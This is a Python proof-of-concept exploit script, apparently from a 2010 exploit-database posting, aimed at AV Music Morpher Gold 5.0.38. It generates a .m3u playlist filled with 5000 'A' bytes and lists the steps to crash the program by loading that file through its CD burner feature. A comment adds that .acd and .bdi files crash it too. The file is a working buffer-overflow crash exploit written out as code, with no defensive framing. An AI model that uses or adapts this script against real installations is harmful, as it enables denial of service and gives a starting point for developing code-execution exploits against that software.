#!/usr/bin/python
#
# Exploit Title: AV Music Morpher Gold (.m3u) Local Crash PoC
# Date: 08-20-2010
# Author: b0telh0
# Software Link: http://www.musicmorpher.com/download.php?product=musicgold
# Version: 5.0.38
# Tested on: Windows XP SP3 (pt-br) VirtualBox

#
# *.acd and *.bdi files will crash the application too!


crash = "\x41" * 5000

try:
    file = open('b0t.m3u','w');
    file.write(crash);
    file.close();
    print "\n[+] b0t.m3u created."
    print "[+] Burner > Create New Audio CD > Right click and 'Add playlist'"
    print "[+] Select b0t.m3u and boom.\n"
except:
    print "\n[-] Error.. Error.. Error.. Error..\n"